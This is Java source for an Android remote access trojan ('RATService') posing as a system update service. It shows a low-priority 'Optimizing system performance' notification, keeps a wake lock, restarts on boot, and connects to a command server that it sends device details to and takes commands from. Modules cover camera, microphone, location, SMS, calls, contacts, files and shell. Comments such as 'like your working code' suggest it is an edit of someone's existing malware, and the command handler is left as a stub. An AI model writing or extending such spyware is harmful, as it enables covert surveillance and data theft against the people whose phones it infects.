package com.android.system.update;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.content.pm.PackageManager;

import com.android.system.update.modules.*;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class RATService extends Service {
    private static final String CHANNEL_ID = "SystemUpdateChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final String TAG = "SystemService";
    private static final long RESTART_DELAY_MS = 5000;
    
    // SIMPLE TIMEOUTS - Like your working code
    private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
    private static final int SOCKET_TIMEOUT = 0; // Infinite - let the read block
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private ExecutorService executor;
    private static volatile RATService instance;
    private PowerManager.WakeLock wakeLock;
    
    // SIMPLE RETRY - Like your working code
    private static final int RETRY_INTERVAL = 30; // seconds
    private static final int MAX_RETRIES = 10;
    
    // Location tracking variables
    private LocationManager locationManager;
    private LocationListener locationListener;
    private HandlerThread locationThread;
    private Handler locationHandler;
    private boolean isLocationTracking = false;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallsModule callsModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;
    private ShellModule shellModule;
    private DeviceModule deviceModule;
    
    // Binder
    public class RATServiceBinder extends Binder {
        public void heartbeat() throws RemoteException {
            if (!isRunning.get()) {
                throw new RemoteException("Service is not running");
            }
        }
    }
    
    private final RATServiceBinder binder = new RATServiceBinder();
    
    public static RATService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        AppController.setConnectionService(this);
        
        Log.d(TAG, "System service initialized");
        
        // Acquire wake lock
        acquireWakeLock();
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize location manager
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        startLocationThread();
        
        // Initialize modules
        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
        deviceModule = new DeviceModule(this);
        
        // SIMPLE: Single executor thread - like your working code
        executor = Executors.newSingleThreadExecutor();
        
        // Set that service should run on boot
        setRunOnBoot(true);
        
        // Start connection
        startConnection();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("System optimization service");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Optimizing system performance")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SystemService::WakeLock"
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(10 * 60 * 1000L);
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
    }
    
    private void startLocationThread() {
        locationThread = new HandlerThread("LocationThread");
        locationThread.start();
        locationHandler = new Handler(locationThread.getLooper());
    }
    
    private void setRunOnBoot(boolean shouldRun) {
        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("should_run", shouldRun).apply();
    }
    
    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }
    
    // SIMPLE: One thread handles everything - like your working code
    private void startConnection() {
        executor.execute(() -> {
            int retryCount = 0;
            
            while (isRunning.get()) {
                try {
                    // Check network
                    if (!isNetworkAvailable()) {
                        Log.d(TAG, "No network, waiting...");
                        Thread.sleep(RETRY_INTERVAL * 1000);
                        continue;
                    }
                    
                    // Connect - simple like your working code
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
                    socket.setKeepAlive(true);
                    
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    Log.d(TAG, "Connected to server");
                    
                    // Reset retry count on success
                    retryCount = 0;
                    
                    // Send initial device info
                    sendDeviceInfo();
                    
                    // SIMPLE: Main processing loop - blocks on readLine()
                    String line;
                    while (isRunning.get() && (line = in.readLine()) != null) {
                        processCommand(line);
                    }
                    
                } catch (SocketTimeoutException e) {
                    Log.e(TAG, "Socket timeout", e);
                } catch (IOException e) {
                    Log.e(TAG, "Connection error", e);
                } catch (Exception e) {
                    Log.e(TAG, "Unexpected error", e);
                } finally {
                    closeConnection();
                }
                
                // SIMPLE retry logic - like your working code
                if (isRunning.get()) {
                    retryCount++;
                    if (retryCount > MAX_RETRIES) {
                        Log.e(TAG, "Max retries reached, stopping");
                        break;
                    }
                    
                    Log.d(TAG, "Reconnecting in " + RETRY_INTERVAL + " seconds (attempt " + retryCount + "/" + MAX_RETRIES + ")");
                    
                    try {
                        Thread.sleep(RETRY_INTERVAL * 1000);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        });
    }
    
    private void closeConnection() {
        try {
            if (out != null) {
                out.close();
                out = null;
            }
            if (in != null) {
                in.close();
                in = null;
            }
            if (socket != null && !socket.isClosed()) {
                socket.close();
                socket = null;
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing connection", e);
        }
    }
    
    private void sendDeviceInfo() {
        String info = String.format("DEVICE|%s|%s|%s|%s|%s",
            getUniqueDeviceId(),
            Build.MANUFACTURER,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
        sendCommand(info);
    }
    
    private void sendCommand(String data) {
        if (out != null) {
            out.println(data);
            out.flush();
        }
    }
    
    // Your existing processCommand method stays exactly the same
    private void processCommand(String command) {
        // ... (keep your existing processCommand code exactly as is)
    }
    
    // Keep all your existing handler methods (handleLocationStreamCommand, etc.)
    
    private String getUniqueDeviceId() {
        SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
        String deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        return deviceId;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy");
        
        isRunning.set(false);
        instance = null;
        
        closeConnection();
        
        if (executor != null) {
            executor.shutdownNow();
        }
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        super.onDestroy();
    }
}
